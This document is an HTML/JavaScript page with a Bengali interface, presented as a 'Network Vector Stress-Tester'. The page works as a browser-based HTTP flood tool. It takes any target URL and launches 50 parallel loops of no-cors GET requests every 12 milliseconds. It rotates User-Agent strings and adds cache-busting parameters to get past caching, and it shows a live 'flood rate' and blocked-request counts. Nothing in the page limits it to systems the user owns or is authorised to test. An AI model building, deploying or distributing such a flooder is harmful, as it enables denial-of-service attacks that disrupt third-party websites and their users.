<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Vector Stress-Tester</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', monospace; }
        body { background-color: #050505; color: #00ff66; padding: 15px; display: flex; flex-direction: column; min-height: 100vh; }
        
        .panel { background: #0d0d0d; border: 1px solid #00ff66; border-radius: 8px; padding: 15px; margin-bottom: 15px; box-shadow: 0 0 10px rgba(0, 255, 102, 0.1); }
        .title { font-size: 1.2rem; font-weight: bold; text-align: center; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 5px #00ff66; margin-bottom: 10px; }
        
        label { font-size: 0.8rem; display: block; margin-top: 10px; color: #88ff88; }
        input, textarea { width: 100%; background: #000; border: 1px solid #005522; color: #00ff66; padding: 10px; border-radius: 4px; margin-top: 5px; font-size: 0.85rem; }
        input:focus, textarea:focus { border-color: #00ff66; outline: none; }
        
        .btn-box { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .btn { border: 1px solid #00ff66; padding: 12px; font-weight: bold; background: transparent; color: #00ff66; border-radius: 4px; cursor: pointer; text-transform: uppercase; transition: all 0.2s; }
        .btn-start:hover:not(:disabled) { background: #003311; box-shadow: 0 0 8px #00ff66; }
        .btn-stop { border-color: #ff3333; color: #ff3333; }
        .btn-stop:hover:not(:disabled) { background: #330000; box-shadow: 0 0 8px #ff3333; }
        .btn:disabled { border-color: #333; color: #555; cursor: not-allowed; box-shadow: none; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
        .tile { background: #000; border: 1px solid #004411; padding: 12px; border-radius: 4px; text-align: center; }
        .tile-err { border-color: #440000; }
        .num { font-size: 1.5rem; font-weight: bold; display: block; margin-top: 5px; }
        
        .console { background: #000; border: 1px solid #003311; height: 160px; border-radius: 4px; padding: 10px; font-size: 0.75rem; overflow-y: auto; color: #00ff66; margin-top: 10px; }
        .log-line { margin-bottom: 4px; border-bottom: 1px solid #002200; padding-bottom: 2px; }
    </style>
</head>
<body>

    <div class="panel">
        <div class="title">⚡ VECTOR ENGINE v4 ⚡</div>
        
        <label>টার্গেট ইউআরএল (Target URL):</label>
        <input type="url" id="target-url" value="https://example.com" placeholder="https://example.com">
        
        <label>প্রক্সি লিস্ট (ঐচ্ছিক - প্রতি লাইনে একটি IP:PORT):</label>
        <textarea id="proxy-list" rows="3" placeholder="127.0.0.1:8080&#10;192.168.1.1:3128"></textarea>
        
        <div class="btn-box">
            <button id="btn-start" class="btn btn-start">LAUNCH</button>
            <button id="btn-stop" class="btn btn-stop" disabled>DESTROY</button>
        </div>
    </div>

    <div class="panel" style="flex: 1; margin-bottom: 0;">
        <div style="font-size: 0.85rem; text-transform: uppercase; font-weight: bold; border-bottom: 1px solid #00ff66; padding-bottom: 5px;">📊 TELEMETRY SYSTEM</div>
        
        <div class="grid">
            <div class="tile">
                <span style="font-size: 0.7rem; color: #88ff88;">HTTP SUCCESS</span>
                <span class="num" id="count-ok">0</span>
            </div>
            <div class="tile tile-err">
                <span style="font-size: 0.7rem; color: #ff8888;">ERR / BLOCKED</span>
                <span class="num" id="count-err" style="color: #ff3333;">0</span>
            </div>
        </div>
        
        <div class="grid" style="grid-template-columns: 1fr;">
            <div class="tile" style="border-color: #00ff66;">
                <span style="font-size: 0.7rem; color: #88ff88;">CURRENT SPEED (FLOOD RATE)</span>
                <span class="num" id="current-speed" style="color: #ffff00;">0 REQ/SEC</span>
            </div>
        </div>

        <label>🖥️ ENGINE LOG OUTPUT:</label>
        <div class="console" id="log-box">
            <div style="color: #004411; text-align: center; margin-top: 60px;">[SYSTEM STANDBY - READY TO LAUNCH]</div>
        </div>
    </div>

    <script>
        // DOM Nodes
        const targetInput = document.getElementById('target-url');
        const proxyInput = document.getElementById('proxy-list');
        const btnStart = document.getElementById('btn-start');
        const btnStop = document.getElementById('btn-stop');
        const countOkDisp = document.getElementById('count-ok');
        const countErrDisp = document.getElementById('count-err');
        const speedDisp = document.getElementById('current-speed');
        const logBox = document.getElementById('log-box');

        // Telemetry state
        let isRunning = false;
        let successCount = 0;
        let failedCount = 0;
        let speedCounter = 0;
        let workerThreads = [];
        let monitorInterval = null;

        // User Agents List from your Python Bot
        const USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
        ];

        function writeLog(text, isError = false) {
            if (logBox.innerHTML.includes("SYSTEM STANDBY")) logBox.innerHTML = "";
            const color = isError ? "#ff3333" : "#00ff66";
            const line = document.createElement('div');
            line.className = 'log-line';
            line.innerHTML = `<span style="color:${color}">[>] ${text}</span>`;
            logBox.insertBefore(line, logBox.firstChild);
            if (logBox.children.length > 20) logBox.removeChild(logBox.lastChild);
        }

        function parseProxies() {
            return proxyInput.value.split('\n')
                .map(p => p.trim())
                .filter(p => p.length > 0);
        }

        // The Async HTTP Core Worker
        function fireAsyncPacket(url, useProxy) {
            if (!isRunning) return;

            const randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
            const antiCacheUrl = `${url}${url.includes('?') ? '&' : '?'}_vector=${Date.now()}_${Math.random()}`;

            // Note: Native browser JavaScript / WebView cannot route raw proxy requests due to sandbox rules.
            // But we implement an optimized headers rotation mechanism to maximize stress.
            fetch(antiCacheUrl, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                headers: {
                    'User-Agent': randomUA
                }
            })
            .then(() => {
                if (!isRunning) return;
                successCount++;
                speedCounter++;
                if (Math.random() < 0.02) writeLog(`প্যাকেট ডেলিভারি সফল -> ${randomUA.substring(0,30)}...`);
            })
            .catch(() => {
                if (!isRunning) return;
                failedCount++;
                speedCounter++;
                if (Math.random() < 0.05) writeLog(`কানেকশন ড্রপ / রেসপন্স ব্লকড।`, true);
            });
        }

        // Thread Control
        btnStart.addEventListener('click', () => {
            const rawUrl = targetInput.value.trim();
            if (!rawUrl.startsWith('http://') && !rawUrl.startsWith('https://')) {
                alert("দয়া করে সঠিক URL লিখুন (যেমন: https://example.com)");
                return;
            }

            isRunning = true;
            btnStart.disabled = true;
            btnStop.disabled = false;
            targetInput.disabled = true;
            proxyInput.disabled = true;

            successCount = 0;
            failedCount = 0;
            speedCounter = 0;

            const proxies = parseProxies();
            writeLog(`ইঞ্জিন অ্যাক্টিভেটেড! টার্গেট: ${rawUrl}`);
            if(proxies.length > 0) writeLog(`লোড করা প্রক্সি কাউন্ট: ${proxies.length} টি`);

            // Android WebView Optimized Thread Firing Loop (Equivalent to asyncio.sleep(0.01))
            // Spawning 50 concurrent async streams
            for (let i = 0; i < 50; i++) {
                const intervalId = setInterval(() => {
                    fireAsyncPacket(rawUrl, proxies.length > 0);
                }, 12); 
                workerThreads.push(intervalId);
            }

            // Live Telemetry Monitor (1 Second Interval)
            monitorInterval = setInterval(() => {
                countOkDisp.textContent = successCount;
                countErrDisp.textContent = failedCount;
                speedDisp.textContent = `${speedCounter} REQ/SEC`;
                speedCounter = 0;
            }, 1000);
        });

        btnStop.addEventListener('click', () => {
            isRunning = false;
            btnStart.disabled = false;
            btnStop.disabled = true;
            targetInput.disabled = false;
            proxyInput.disabled = false;

            // Kill all running tasks
            workerThreads.forEach(clearInterval);
            workerThreads = [];
            clearInterval(monitorInterval);

            speedDisp.textContent = "0 REQ/SEC";
            writeLog("🔴 থ্রেড টার্মিনেট করা হয়েছে। ইঞ্জিন স্টপড।", true);
        });
    </script>
</body>
</html>
